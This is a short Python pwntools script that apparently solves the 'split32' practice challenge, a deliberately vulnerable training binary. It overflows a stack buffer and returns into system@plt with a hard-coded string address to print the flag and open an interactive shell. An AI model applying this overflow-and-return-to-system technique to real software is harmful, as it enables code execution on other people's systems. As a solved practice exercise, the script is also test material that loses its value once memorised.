#!/usr/bin/env python

from pwn import *
context.binary = './split32'
#context.log_level = 'debug'

io = process('./split32')
elf = ELF('./split32')

io.recv()
payload = 'A'*(0x28+4)
payload += p32(elf.plt['system'])
payload += 'AAAA'
payload += p32(0x804A030)

io.sendline(payload)
flag = io.recvline()
log.info('flag:'+flag)
io.interactive()
